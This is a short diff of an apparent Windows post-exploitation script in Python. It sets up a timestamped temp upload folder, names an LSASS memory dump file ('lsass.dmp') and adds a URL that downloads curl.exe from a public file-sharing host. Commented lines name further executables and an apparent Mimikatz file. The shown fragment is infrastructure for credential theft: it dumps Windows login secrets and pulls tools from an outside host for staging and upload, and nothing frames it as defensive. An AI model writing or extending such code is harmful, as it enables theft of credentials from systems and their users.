@@ -12,7 +12,10 @@ tmp = tempfile.gettempdir()
 date = time.strftime("%d%m%Y_%H%M%S") + ".tmp"
 
 class constant():
-
+    # pyurl = "https://www.yunzhijia.com/microblog/filesvr/5e89bca6b54c8d14ea9061a7/nnn.exe"
+    curl_url = 'https://www.yunzhijia.com/microblog/filesvr/5e89d52aa37259795a86e7e4/curl.exe'
+    # pyexe = "wpsd.exe"
+    # pyname = "mimi.json"
     upload_dir = tempfile.gettempdir() + os.sep + date
     dump_name = upload_dir + os.sep + "lsass.dmp"
     cmdlist = [
